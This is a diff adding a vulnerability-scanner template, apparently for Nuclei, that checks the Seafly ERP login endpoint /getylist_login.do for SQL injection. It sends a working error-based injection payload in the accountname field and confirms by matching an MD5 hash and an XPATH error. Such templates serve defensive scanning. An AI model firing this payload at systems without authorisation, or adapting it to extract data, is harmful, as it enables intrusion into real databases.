@@ -1,0 +1,32 @@
+id: poc-yaml-seafly-erp-getylist-login-do-sqli
+info:
+  name: 海翔ERP getylist_login.do SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(100, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "/getylist_login.do"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "accountname=1%27or(updatexml(1,concat(0x7e,(select%20md5({{t1}})),0x7e),1));--"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error"
